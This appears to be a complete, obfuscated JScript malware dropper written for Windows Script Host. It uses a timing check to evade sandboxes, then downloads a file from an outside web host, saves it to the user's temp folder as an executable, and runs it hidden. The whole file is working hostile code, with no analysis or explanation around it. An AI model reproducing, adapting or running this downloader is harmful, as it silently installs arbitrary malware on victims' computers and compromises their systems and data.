var Mn = false;
var Y = "CreateObject";
var wZ = function V() {return WScript[Y]("WScript.Shell");}(), t = 11;
var d0 = "MSXML2.XMLHTTP";
var we0 = 2123213;
var Cq = 0;
function we(d2){wZ["Run"](d2, Cq, Cq);};
function HO(){return "" + d0;};
function ut(GX, Hd){Cq = Cq * 1; return GX - Hd;};
function vq(){return Y;};
/*@cc_on
  @if (@_win32 || @_win64)
    Mn = true;
  @end
@*/
if (Mn)
{
var SC = "";
function x(){return 22;};
var ql = 0; var rz = 0;
function Ra()
{
var e = new this["Date"]();
var ld = e["getUTCMilliseconds"]();
WScript["Sleep"](x());
var e = new this["Date"]();
var X = e["getUTCMilliseconds"]();
WScript["Sleep"](x());
var e = new this["Date"]();
var r = e["getUTCMilliseconds"]();
var ql = "Lu";
ql = ut(X, ld);
var rz = "Pp";
rz = ut(r, X);
SC = "open";
return ut(ql, rz);
}
var i = false;
var Dr = false;
for (var N = Cq; N < x() * 1; N++){if (Ra() != Cq){
i = true; 
rz = "31" + 11 * ql + rz; 
Dr = true; 
break;
}}
function Kw() {return ((i == true) && (i == Dr)) ? 1 : Cq;};
if (i && Kw() && Dr){
function d() {return wZ["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "oSisykTCRFAQC.exe";};
 t0 = HO();
 r0 = WScript[Y](t0);
 var b = 1;
 while (b){
try {
r0[SC]("GET", "http://blog.insite.pt/m8djs", false);
r0["send"]();
d1 = "Sleep";
for (;;){WScript[d1](x() * 11); if (r0["readystate"] >= 2 * 2) break;};
b = Cq;
} catch(st){};
}
function OB(md) {var m = (1, 2, 3, 4, 5, md); return m;};
jG = WScript[vq()]("ADODB.Stream");
t0 = jG;
t0[SC]();
t0["type"] = OB(1);
t0["write"](r0["ResponseBody"]);
jG["position"] = OB(Cq);
t0["Save" + "ToFile"](d(), 2);
jG["c"+"lose"]();
l = d();
we(l);
}
}

